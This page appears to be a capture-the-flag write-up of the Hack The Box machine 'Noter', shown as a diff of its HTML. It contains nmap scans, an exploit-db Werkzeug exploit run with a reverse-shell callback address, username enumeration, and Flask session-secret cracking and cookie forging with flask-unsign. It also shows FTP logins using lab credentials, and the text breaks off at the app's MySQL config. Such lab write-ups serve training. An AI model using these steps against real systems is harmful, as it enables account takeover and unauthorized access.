@@ -1,0 +1,972 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en"><head>
+
+<meta charset="utf-8">
+<meta name="generator" content="quarto-1.7.32">
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+
+<meta name="author" content="0xPThree">
+<meta name="dcterms.date" content="2022-05-23">
+<meta name="description" content="Noter is an medium-rated machine from Hack The Box. Even though it’s medium rating I found this box to be very straight forward with little to none rabbit holes, and thus I would rate it as easy. Doing this box I found a new tool in regards to JWT, and learned about certain MySQL functions.">
+
+<title>Noter - Hack The Box – Exploit.se</title>
+<style>
+code{white-space: pre-wrap;}
+span.smallcaps{font-variant: small-caps;}
+div.columns{display: flex; gap: min(4vw, 1.5em);}
+div.column{flex: auto; overflow-x: auto;}
+div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+ul.task-list{list-style: none;}
+ul.task-list li input[type="checkbox"] {
+  width: 0.8em;
+  margin: 0 0.8em 0.2em -1em; /* quarto-specific, see https://github.com/quarto-dev/quarto-cli/issues/4556 */ 
+  vertical-align: middle;
+}
+/* CSS for syntax highlighting */
+html { -webkit-text-size-adjust: 100%; }
+pre > code.sourceCode { white-space: pre; position: relative; }
+pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
+pre > code.sourceCode > span:empty { height: 1.2em; }
+.sourceCode { overflow: visible; }
+code.sourceCode > span { color: inherit; text-decoration: inherit; }
+div.sourceCode { margin: 1em 0; }
+pre.sourceCode { margin: 0; }
+@media screen {
+div.sourceCode { overflow: auto; }
+}
+@media print {
+pre > code.sourceCode { white-space: pre-wrap; }
+pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
+}
+pre.numberSource code
+  { counter-reset: source-line 0; }
+pre.numberSource code > span
+  { position: relative; left: -4em; counter-increment: source-line; }
+pre.numberSource code > span > a:first-child::before
+  { content: counter(source-line);
+    position: relative; left: -1em; text-align: right; vertical-align: baseline;
+    border: none; display: inline-block;
+    -webkit-touch-callout: none; -webkit-user-select: none;
+    -khtml-user-select: none; -moz-user-select: none;
+    -ms-user-select: none; user-select: none;
+    padding: 0 4px; width: 4em;
+  }
+pre.numberSource { margin-left: 3em;  padding-left: 4px; }
+div.sourceCode
+  {   }
+@media screen {
+pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+}
+</style>
+
+
+<script src="../../site_libs/quarto-nav/quarto-nav.js"></script>
+<script src="../../site_libs/quarto-nav/headroom.min.js"></script>
+<script src="../../site_libs/clipboard/clipboard.min.js"></script>
+<script src="../../site_libs/quarto-search/autocomplete.umd.js"></script>
+<script src="../../site_libs/quarto-search/fuse.min.js"></script>
+<script src="../../site_libs/quarto-search/quarto-search.js"></script>
+<meta name="quarto:offset" content="../../">
+<link href="../../favicon.ico" rel="icon">
+<script src="../../site_libs/quarto-html/quarto.js" type="module"></script>
+<script src="../../site_libs/quarto-html/tabsets/tabsets.js" type="module"></script>
+<script src="../../site_libs/quarto-html/popper.min.js"></script>
+<script src="../../site_libs/quarto-html/tippy.umd.min.js"></script>
+<script src="../../site_libs/quarto-html/anchor.min.js"></script>
+<link href="../../site_libs/quarto-html/tippy.css" rel="stylesheet">
+<link href="../../site_libs/quarto-html/quarto-syntax-highlighting-37eea08aefeeee20ff55810ff984fec1.css" rel="stylesheet" id="quarto-text-highlighting-styles">
+<script src="../../site_libs/bootstrap/bootstrap.min.js"></script>
+<link href="../../site_libs/bootstrap/bootstrap-icons.css" rel="stylesheet">
+<link href="../../site_libs/bootstrap/bootstrap-a98ec624fb63d9b712fc3a6f62e2b305.min.css" rel="stylesheet" append-hash="true" id="quarto-bootstrap" data-mode="light">
+<script id="quarto-search-options" type="application/json">{
+  "location": "navbar",
+  "copy-button": false,
+  "collapse-after": 3,
+  "panel-placement": "end",
+  "type": "overlay",
+  "limit": 50,
+  "keyboard-shortcut": [
+    "f",
+    "/",
+    "s"
+  ],
+  "show-item-context": false,
+  "language": {
+    "search-no-results-text": "No results",
+    "search-matching-documents-text": "matching documents",
+    "search-copy-link-title": "Copy link to search",
+    "search-hide-matches-text": "Hide additional matches",
+    "search-more-match-text": "more match in this document",
+    "search-more-matches-text": "more matches in this document",
+    "search-clear-button-title": "Clear",
+    "search-text-placeholder": "",
+    "search-detached-cancel-button-title": "Cancel",
+    "search-submit-button-title": "Submit",
+    "search-label": "Search"
+  }
+}</script>
+<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-XVW5CQ7DG5"></script>
+
+<script type="text/javascript">
+
+window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-XVW5CQ7DG5', { 'anonymize_ip': true});
+</script>
+
+
+<link rel="stylesheet" href="../../scss/styles.css">
+<link rel="stylesheet" href="../../scss/bootstrap-dark.min.css">
+<link rel="stylesheet" href="../../scss/quarto-syntax-highlighting-dark.css">
+<link rel="stylesheet" href="../../scss/bootstrap-icons.css">
+</head>
+
+<body class="nav-fixed quarto-light">
+
+<div id="quarto-search-results"></div>
+  <header id="quarto-header" class="headroom fixed-top quarto-banner">
+    <nav class="navbar navbar-expand-lg " data-bs-theme="dark">
+      <div class="navbar-container container-fluid">
+      <div class="navbar-brand-container mx-auto">
+    <a href="../../index.html" class="navbar-brand navbar-brand-logo">
+    <img src="../../static/exploit_white-orange.png" alt="" class="navbar-logo">
+    </a>
+  </div>
+            <div id="quarto-search" class="" title="Search"></div>
+          <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarCollapse" aria-controls="navbarCollapse" role="menu" aria-expanded="false" aria-label="Toggle navigation" onclick="if (window.quartoToggleHeadroom) { window.quartoToggleHeadroom(); }">
+  <span class="navbar-toggler-icon"></span>
+</button>
+          <div class="collapse navbar-collapse" id="navbarCollapse">
+            <ul class="navbar-nav navbar-nav-scroll ms-auto">
+  <li class="nav-item">
+    <a class="nav-link" href="../../writeups.html"> 
+<span class="menu-text">Writeups</span></a>
+  </li>  
+  <li class="nav-item">
+    <a class="nav-link" href="https://0xpthree.gitbook.io/notes"> 
+<span class="menu-text">Notes</span></a>
+  </li>  
+  <li class="nav-item">
+    <a class="nav-link" href="../../about.html"> 
+<span class="menu-text">About</span></a>
+  </li>  
+</ul>
+          </div> <!-- /navcollapse -->
+            <div class="quarto-navbar-tools">
+</div>
+      </div> <!-- /container-fluid -->
+    </nav>
+</header>
+<!-- content -->
+<header id="title-block-header" class="quarto-title-block default page-columns page-full">
+  <div class="quarto-title-banner page-columns page-full">
+    <div class="quarto-title column-body">
+      <h1 class="title">Noter - Hack The Box</h1>
+                  <div>
+        <div class="description">
+          Noter is an medium-rated machine from Hack The Box. Even though it’s medium rating I found this box to be very straight forward with little to none rabbit holes, and thus I would rate it as easy. Doing this box I found a new tool in regards to JWT, and learned about certain MySQL functions.
+        </div>
+      </div>
+                          <div class="quarto-categories">
+                <div class="quarto-category">hackthebox</div>
+                <div class="quarto-category">medium</div>
+                <div class="quarto-category">linux</div>
+                <div class="quarto-category">ftp</div>
+                <div class="quarto-category">bruteforce</div>
+                <div class="quarto-category">flask</div>
+                <div class="quarto-category">subprocess</div>
+                <div class="quarto-category">mysql</div>
+              </div>
+                  </div>
+  </div>
+    
+  
+  <div class="quarto-title-meta">
+
+      <div>
+      <div class="quarto-title-meta-heading">Author</div>
+      <div class="quarto-title-meta-contents">
+               <p>0xPThree </p>
+            </div>
+    </div>
+      
+      <div>
+      <div class="quarto-title-meta-heading">Published</div>
+      <div class="quarto-title-meta-contents">
+        <p class="date">May 23, 2022</p>
+      </div>
+    </div>
+    
+      
+    </div>
+    
+  
+  </header><div id="quarto-content" class="quarto-container page-columns page-rows-contents page-layout-article page-navbar">
+<!-- sidebar -->
+<!-- margin-sidebar -->
+    <div id="quarto-margin-sidebar" class="sidebar margin-sidebar">
+        <nav id="TOC" role="doc-toc" class="toc-active">
+    <h2 id="toc-title">On this page</h2>
+   
+  <ul>
+  <li><a href="#user" id="toc-user" class="nav-link active" data-scroll-target="#user">USER</a>
+  <ul class="collapse">
+  <li><a href="#step-1" id="toc-step-1" class="nav-link" data-scroll-target="#step-1">Step 1</a></li>
+  <li><a href="#step-2" id="toc-step-2" class="nav-link" data-scroll-target="#step-2">Step 2</a></li>
+  <li><a href="#step-3" id="toc-step-3" class="nav-link" data-scroll-target="#step-3">Step 3</a></li>
+  <li><a href="#step-4" id="toc-step-4" class="nav-link" data-scroll-target="#step-4">Step 4</a></li>
+  </ul></li>
+  <li><a href="#root" id="toc-root" class="nav-link" data-scroll-target="#root">ROOT</a>
+  <ul class="collapse">
+  <li><a href="#step-1-1" id="toc-step-1-1" class="nav-link" data-scroll-target="#step-1-1">Step 1</a></li>
+  </ul></li>
+  <li><a href="#references" id="toc-references" class="nav-link" data-scroll-target="#references">References</a></li>
+  </ul>
+</nav>
+    </div>
+<!-- main -->
+<main class="content quarto-banner-title-block" id="quarto-document-content">
+
+
+
+
+
+<section id="user" class="level1">
+<h1>USER</h1>
+<section id="step-1" class="level3">
+<h3 class="anchored" data-anchor-id="step-1">Step 1</h3>
+<p><strong>nmap:</strong></p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  noter nmap <span class="at">-p-</span> <span class="at">-Pn</span> 10.10.11.160 <span class="at">-v</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="ex">PORT</span>     STATE SERVICE</span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="ex">21/tcp</span>   open  ftp</span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="ex">22/tcp</span>   open  ssh</span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a><span class="ex">5000/tcp</span> open  upnp</span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  noter nmap <span class="at">-Pn</span> <span class="at">-n</span> <span class="at">-sCV</span> <span class="at">-p21,22,5000</span> 10.10.11.160</span>
+<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a><span class="ex">PORT</span>     STATE SERVICE VERSION</span>
+<span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a><span class="ex">21/tcp</span>   open  ftp     vsftpd 3.0.3</span>
+<span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a><span class="ex">22/tcp</span>   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="er">(</span><span class="ex">Ubuntu</span> Linux<span class="kw">;</span> <span class="ex">protocol</span> 2.0<span class="kw">)</span></span>
+<span id="cb1-12"><a href="#cb1-12" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">ssh-hostkey:</span> </span>
+<span id="cb1-13"><a href="#cb1-13" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>   <span class="ex">3072</span> c6:53:c6:2a:e9:28:90:50:4d:0c:8d:64:88:e0:08:4d <span class="er">(</span><span class="ex">RSA</span><span class="kw">)</span></span>
+<span id="cb1-14"><a href="#cb1-14" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>   <span class="ex">256</span> 5f:12:58:5f:49:7d:f3:6c:bd:9b:25:49:ba:09:cc:43 <span class="er">(</span><span class="ex">ECDSA</span><span class="kw">)</span></span>
+<span id="cb1-15"><a href="#cb1-15" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_</span>  256 f1:6b:00:16:f7:88:ab:00:ce:96:af:a6:7e:b5:a8:39 <span class="er">(</span><span class="ex">ED25519</span><span class="kw">)</span></span>
+<span id="cb1-16"><a href="#cb1-16" aria-hidden="true" tabindex="-1"></a><span class="ex">5000/tcp</span> open  http    Werkzeug httpd 2.0.2 <span class="er">(</span><span class="ex">Python</span> 3.8.10<span class="kw">)</span></span>
+<span id="cb1-17"><a href="#cb1-17" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_http-title:</span> Noter</span>
+<span id="cb1-18"><a href="#cb1-18" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_http-server-header:</span> Werkzeug/2.0.2 Python/3.8.10</span>
+<span id="cb1-19"><a href="#cb1-19" aria-hidden="true" tabindex="-1"></a><span class="ex">Service</span> Info: OSs: Unix, Linux<span class="kw">;</span> <span class="ex">CPE:</span> cpe:/o:linux:linux_kernel</span>
+<span id="cb1-20"><a href="#cb1-20" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-21"><a href="#cb1-21" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-22"><a href="#cb1-22" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  noter sudo nmap <span class="at">-sU</span> <span class="at">--top-port</span><span class="op">=</span>50 <span class="at">--open</span> 10.10.11.160</span>
+<span id="cb1-23"><a href="#cb1-23" aria-hidden="true" tabindex="-1"></a><span class="ex">PORT</span>   STATE         SERVICE</span>
+<span id="cb1-24"><a href="#cb1-24" aria-hidden="true" tabindex="-1"></a><span class="ex">68/udp</span> open<span class="kw">|</span><span class="ex">filtered</span> dhcpc</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>FTP is always fun, however from nmap it doesn’t seem like anonymous logins are enabled. Checking this manually confirms that’s the case.</p>
+<p>Werkzeug has a known code execution if debug is enabled, quickly check with script in Kali.</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  Downloads python2 /usr/share/exploitdb/exploits/multiple/remote/43905.py 10.10.11.160 5000 10.10.14.26 4488</span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[-]</span> Debug is not enabled</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Browse port 5000 and we are met with a very simple page. <img src="images/noter01.png" class="img-fluid"></p>
+<p>Trying bacis authentication bypasses doesn’t give anything, so instead we create an account with credentials <code>admin:admin</code>.</p>
+<p>When posting a new note, pressing the <code>?</code> icon we find the information <code>CKEditor 4.6.2 (revision 20af917)</code>. Googling around it seems to be vulnerable to XSS, although the post seems to be done with a CDN, so not local and should not be seen as a attack vector.</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a>    <span class="op">&lt;</span>script <span class="va">src</span><span class="op">=</span><span class="st">"//cdn.ckeditor.com/4.6.2/basic/ckeditor.js"</span><span class="op">&gt;&lt;</span>/script<span class="op">&gt;</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a>    <span class="op">&lt;</span>script <span class="va">type</span><span class="op">=</span><span class="st">"text/javascript"</span><span class="op">&gt;</span></span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a>      <span class="ex">CKEDITOR.replace</span><span class="er">(</span><span class="st">'editor'</span><span class="kw">)</span></span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a>    <span class="op">&lt;</span>/script<span class="op">&gt;</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>After some enumeration I finally found that the login validates if the username is correct or not. Trying to login with an invalid user gives the error <code>Invalid credentials</code>, however trying a valid user and wrong password gives <code>Invalid login</code>.</p>
+<p>With this information we send the login to Burp Intruder, add the two strings to “Grep - Match” and brute force the user using Burp built-in Usernames list.</p>
+<p><img src="images/noter02.png" class="img-fluid"></p>
+<p>Admin is my registered user, however <code>blue</code> is not - we found a valid user!</p>
+</section>
+<section id="step-2" class="level3">
+<h3 class="anchored" data-anchor-id="step-2">Step 2</h3>
+<p>Next we need to find the credentials for user <code>blue</code>, we can try to brute force the login which would cause a lot of noice, but we can also try to to crack the JWT (as it’s HMAC).</p>
+<p><img src="images/noter03.png" class="img-fluid"></p>
+<p>Running <code>webanalyze</code> we find that Flask is running on the backend. Reading through HackTricks about Flask we find the tool <code>Flask-Unsign</code> which is used to fetch, decode, brute-force and craft session cookies of Flask applications - perfect!</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  webanalyze ./webanalyze <span class="at">-host</span> http://10.10.11.160:5000</span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="ex">http://10.10.11.160:5000</span> <span class="er">(</span><span class="ex">0.1s</span><span class="kw">)</span><span class="bu">:</span></span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Bootstrap,</span>  <span class="er">(</span><span class="ex">UI</span> frameworks<span class="kw">)</span></span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Flask,</span> 2.0.2 <span class="er">(</span><span class="ex">Web</span> frameworks, Web servers<span class="kw">)</span></span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Python,</span>  <span class="er">(</span><span class="ex">Programming</span> languages<span class="kw">)</span></span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Python,</span> 3.8.10 <span class="er">(</span><span class="ex">Programming</span> languages<span class="kw">)</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<div class="sourceCode" id="cb5"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  noter flask-unsign <span class="at">--decode</span> <span class="at">--cookie</span> <span class="st">'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkZiJ9.YosnvA.92mU6dpP4-5opRXc6h2EhLq8hVI'</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a><span class="ex">{</span><span class="st">'logged_in'</span><span class="ex">:</span> True, <span class="st">'username'</span>: <span class="st">'asdf'</span>}</span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  noter flask-unsign <span class="at">--wordlist</span> /usr/share/wordlists/rockyou.txt <span class="at">--unsign</span> <span class="at">--cookie</span> <span class="st">'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkZiJ9.YosnvA.92mU6dpP4-5opRXc6h2EhLq8hVI'</span> <span class="at">--no-literal-eval</span></span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> Session decodes to: {<span class="st">'logged_in'</span>: True, <span class="st">'username'</span>: <span class="st">'asdf'</span>}</span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> Starting brute-forcer with 8 threads..</span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Found secret key after 17152 attempts</span>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a><span class="ex">b</span><span class="st">'secret123'</span></span>
+<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  noter flask-unsign <span class="at">--sign</span> <span class="at">--cookie</span> <span class="st">"{'logged_in': True, 'username': 'blue'}"</span> <span class="at">--secret</span> <span class="st">'secret123'</span>                                                   </span>
+<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a><span class="ex">eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.Yos0Lw.Lp1b4zGs-GrDuPvgxv2kkkC3qzE</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Change the browser session cookie and refresh the page, and boom we are <code>blue</code>! <strong>Note</strong>: As a VIP user we can Import and Export notes.</p>
+<p><img src="images/noter04.png" class="img-fluid"></p>
+</section>
+<section id="step-3" class="level3">
+<h3 class="anchored" data-anchor-id="step-3">Step 3</h3>
+<p>Blue have two notes and in one of them we find the clear text credentials to the FTP - <code>blue:blue@Noter!</code> But we also find the username <code>ftp_admin</code>. <img src="images/noter05.png" class="img-fluid"></p>
+<p>Login to the FTP using found credentials. Within we find the file <code>policy.pdf</code>, download the file and review it.</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  noter ftp 10.10.11.160</span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Connected</span> to 10.10.11.160.</span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a><span class="ex">220</span> <span class="er">(</span><span class="ex">vsFTPd</span> 3.0.3<span class="kw">)</span></span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Name</span> <span class="er">(</span><span class="ex">10.10.11.160:void</span><span class="kw">)</span><span class="bu">:</span> blue </span>
+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a><span class="ex">331</span> Please specify the password.</span>
+<span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a><span class="ex">Password:</span></span>
+<span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a><span class="ex">230</span> Login successful.</span>
+<span id="cb6-8"><a href="#cb6-8" aria-hidden="true" tabindex="-1"></a><span class="ex">Remote</span> system type is UNIX.</span>
+<span id="cb6-9"><a href="#cb6-9" aria-hidden="true" tabindex="-1"></a><span class="ex">Using</span> binary mode to transfer files.</span>
+<span id="cb6-10"><a href="#cb6-10" aria-hidden="true" tabindex="-1"></a><span class="fu">ftp</span><span class="op">&gt;</span> ls</span>
+<span id="cb6-11"><a href="#cb6-11" aria-hidden="true" tabindex="-1"></a><span class="ex">200</span> PORT command successful. Consider using PASV.</span>
+<span id="cb6-12"><a href="#cb6-12" aria-hidden="true" tabindex="-1"></a><span class="ex">150</span> Here comes the directory listing.</span>
+<span id="cb6-13"><a href="#cb6-13" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxr-xr-x</span>    2 1002     1002         4096 May 02 23:05 files</span>
+<span id="cb6-14"><a href="#cb6-14" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-r--r--</span>    1 1002     1002        12569 Dec 24 20:59 policy.pdf</span>
+<span id="cb6-15"><a href="#cb6-15" aria-hidden="true" tabindex="-1"></a><span class="ex">226</span> Directory send OK.</span>
+<span id="cb6-16"><a href="#cb6-16" aria-hidden="true" tabindex="-1"></a><span class="fu">ftp</span><span class="op">&gt;</span> mget <span class="pp">*</span></span>
+<span id="cb6-17"><a href="#cb6-17" aria-hidden="true" tabindex="-1"></a><span class="ex">mget</span> policy.pdf<span class="pp">?</span> y</span>
+<span id="cb6-18"><a href="#cb6-18" aria-hidden="true" tabindex="-1"></a><span class="ex">200</span> PORT command successful. Consider using PASV.</span>
+<span id="cb6-19"><a href="#cb6-19" aria-hidden="true" tabindex="-1"></a><span class="ex">150</span> Opening BINARY mode data connection for policy.pdf <span class="er">(</span><span class="ex">12569</span> bytes<span class="kw">)</span><span class="bu">.</span></span>
+<span id="cb6-20"><a href="#cb6-20" aria-hidden="true" tabindex="-1"></a><span class="ex">226</span> Transfer complete.</span>
+<span id="cb6-21"><a href="#cb6-21" aria-hidden="true" tabindex="-1"></a><span class="ex">12569</span> bytes received in 0.00 secs <span class="er">(</span><span class="ex">9.2992</span> MB/s<span class="kw">)</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>The pdf is a password policy, and within we find the line; <em>“Default user-password generated by the application is in the format of”username@site_name!” (This applies to all your applications)“</em></p>
+<p>We can try if this applies to <code>ftp_admin:ftp_admin@Noter!</code> as well.</p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  noter ftp 10.10.11.160                                                                           </span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Connected</span> to 10.10.11.160.</span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a><span class="ex">220</span> <span class="er">(</span><span class="ex">vsFTPd</span> 3.0.3<span class="kw">)</span></span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Name</span> <span class="er">(</span><span class="ex">10.10.11.160:void</span><span class="kw">)</span><span class="bu">:</span> ftp_admin</span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a><span class="ex">331</span> Please specify the password.</span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a><span class="ex">Password:</span></span>
+<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a><span class="ex">230</span> Login successful.</span>
+<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a><span class="ex">Remote</span> system type is UNIX.</span>
+<span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a><span class="ex">Using</span> binary mode to transfer files.</span>
+<span id="cb7-10"><a href="#cb7-10" aria-hidden="true" tabindex="-1"></a><span class="fu">ftp</span><span class="op">&gt;</span> ls</span>
+<span id="cb7-11"><a href="#cb7-11" aria-hidden="true" tabindex="-1"></a><span class="ex">200</span> PORT command successful. Consider using PASV.</span>
+<span id="cb7-12"><a href="#cb7-12" aria-hidden="true" tabindex="-1"></a><span class="ex">150</span> Here comes the directory listing.</span>
+<span id="cb7-13"><a href="#cb7-13" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-r--r--</span>    1 1003     1003        25559 Nov 01  2021 app_backup_1635803546.zip</span>
+<span id="cb7-14"><a href="#cb7-14" aria-hidden="true" tabindex="-1"></a><span class="ex">-rw-r--r--</span>    1 1003     1003        26298 Dec 01 05:52 app_backup_1638395546.zip</span>
+<span id="cb7-15"><a href="#cb7-15" aria-hidden="true" tabindex="-1"></a><span class="ex">226</span> Directory send OK.</span>
+<span id="cb7-16"><a href="#cb7-16" aria-hidden="true" tabindex="-1"></a><span class="fu">ftp</span><span class="op">&gt;</span> mget <span class="pp">*</span></span>
+<span id="cb7-17"><a href="#cb7-17" aria-hidden="true" tabindex="-1"></a><span class="ex">mget</span> app_backup_1635803546.zip<span class="pp">?</span> y</span>
+<span id="cb7-18"><a href="#cb7-18" aria-hidden="true" tabindex="-1"></a><span class="ex">200</span> PORT command successful. Consider using PASV.</span>
+<span id="cb7-19"><a href="#cb7-19" aria-hidden="true" tabindex="-1"></a><span class="ex">150</span> Opening BINARY mode data connection for app_backup_1635803546.zip <span class="er">(</span><span class="ex">25559</span> bytes<span class="kw">)</span><span class="bu">.</span></span>
+<span id="cb7-20"><a href="#cb7-20" aria-hidden="true" tabindex="-1"></a><span class="ex">226</span> Transfer complete.</span>
+<span id="cb7-21"><a href="#cb7-21" aria-hidden="true" tabindex="-1"></a><span class="ex">25559</span> bytes received in 0.03 secs <span class="er">(</span><span class="ex">783.7460</span> kB/s<span class="kw">)</span></span>
+<span id="cb7-22"><a href="#cb7-22" aria-hidden="true" tabindex="-1"></a><span class="ex">mget</span> app_backup_1638395546.zip<span class="pp">?</span> y</span>
+<span id="cb7-23"><a href="#cb7-23" aria-hidden="true" tabindex="-1"></a><span class="ex">200</span> PORT command successful. Consider using PASV.</span>
+<span id="cb7-24"><a href="#cb7-24" aria-hidden="true" tabindex="-1"></a><span class="ex">150</span> Opening BINARY mode data connection for app_backup_1638395546.zip <span class="er">(</span><span class="ex">26298</span> bytes<span class="kw">)</span><span class="bu">.</span></span>
+<span id="cb7-25"><a href="#cb7-25" aria-hidden="true" tabindex="-1"></a><span class="ex">226</span> Transfer complete.</span>
+<span id="cb7-26"><a href="#cb7-26" aria-hidden="true" tabindex="-1"></a><span class="ex">26298</span> bytes received in 0.03 secs <span class="er">(</span><span class="ex">811.6058</span> kB/s<span class="kw">)</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+</section>
+<section id="step-4" class="level3">
+<h3 class="anchored" data-anchor-id="step-4">Step 4</h3>
+<p>Review the backup files <strong><code>app_backup_1638395546</code></strong> and we find.. .. <strong>MySQL Config - <code>app.py</code></strong></p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="ex">app.config[</span><span class="st">'MYSQL_HOST'</span><span class="ex">]</span> = <span class="st">'localhost'</span></span>
